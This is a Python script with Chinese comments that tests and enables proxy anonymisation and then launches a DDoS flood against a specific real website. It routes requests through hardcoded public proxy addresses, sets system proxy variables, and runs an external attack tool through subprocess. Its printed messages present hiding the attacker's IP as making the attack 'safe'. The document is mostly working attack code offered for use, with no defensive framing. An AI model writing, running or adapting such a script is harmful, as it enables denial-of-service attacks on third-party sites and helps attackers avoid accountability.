#!/usr/bin/env python3
"""
快速匿名保护测试工具
验证代理保护是否生效
"""

import requests
import random

def test_protection():
    """测试匿名保护效果"""
    print("🔍 测试匿名保护效果...")
    
    # 测试真实IP
    try:
        response = requests.get('http://httpbin.org/ip', timeout=5)
        real_ip = response.json().get('origin', '未知')
        print(f"📡 您的真实IP: {real_ip}")
    except:
        print("❌ 无法获取真实IP")
        return False
    
    # 测试代理保护
    proxy_list = [
        '8.213.128.6:9091',
        '8.211.194.85:31433',
        '39.102.214.208:9999',
        '206.84.201.101:999'
    ]
    
    for proxy in proxy_list:
        try:
            proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            response = requests.get('http://httpbin.org/ip', proxies=proxies, timeout=5)
            proxy_ip = response.json().get('origin', '未知')
            
            if proxy_ip != real_ip:
                print(f"✅ 代理保护生效!")
                print(f"🔗 通过代理的IP: {proxy_ip}")
                print(f"🎯 真实IP已隐藏")
                return True
            else:
                print(f"❌ 代理 {proxy} 无效")
        except:
            print(f"❌ 代理 {proxy} 连接失败")
    
    print("❌ 所有代理测试失败，匿名保护未生效")
    return False

def enable_basic_protection():
    """启用基础代理保护"""
    print("\n🛡️ 启用基础匿名保护...")
    
    # 设置系统代理（临时）
    proxy = '8.213.128.6:9091'
    
    # 设置环境变量
    import os
    os.environ['HTTP_PROXY'] = f'http://{proxy}'
    os.environ['HTTPS_PROXY'] = f'http://{proxy}'
    
    print(f"🔧 已设置系统代理: {proxy}")
    
    # 验证保护效果
    if test_protection():
        print("\n✅ 基础匿名保护已启用")
        print("💡 现在可以安全地进行DDoS攻击")
        return True
    else:
        print("\n❌ 基础匿名保护启用失败")
        return False

def safe_ddos_with_protection(target_url):
    """在保护下进行安全DDoS攻击"""
    print(f"\n🚀 启动安全DDoS攻击 (带保护)")
    print(f"🎯 目标: {target_url}")
    
    # 验证保护
    if not test_protection():
        print("❌ 保护未生效，无法安全攻击")
        return
    
    # 使用安全的攻击命令
    command = f'python start.py GET {target_url} 0 100 proxies.txt 100 60'
    print(f"📝 攻击命令: {command}")
    
    import subprocess
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        print("✅ 攻击已启动")
        print(f"📊 输出: {result.stdout}")
    except Exception as e:
        print(f"❌ 攻击启动失败: {e}")

def main():
    target = "https://www.kjqun.cn/"
    
    print("="*60)
    print("🛡️ 快速匿名保护测试工具")
    print("="*60)
    
    # 1. 测试当前保护状态
    print("\n1. 测试当前保护状态:")
    current_status = test_protection()
    
    if not current_status:
        # 2. 启用基础保护
        print("\n2. 启用基础保护:")
        if enable_basic_protection():
            # 3. 安全攻击
            print("\n3. 启动安全攻击:")
            safe_ddos_with_protection(target)
        else:
            print("\n❌ 无法启用保护，请手动配置代理")
    else:
        # 直接安全攻击
        print("\n✅ 保护已生效，直接启动安全攻击:")
        safe_ddos_with_protection(target)
    
    print("\n" + "="*60)
    print("💡 使用说明:")
    print("- 运行此工具测试保护效果")
    print("- 如果保护未生效，工具会自动启用基础保护")
    print("- 在保护下进行DDoS攻击更安全")
    print("="*60)

if __name__ == "__main__":
    main()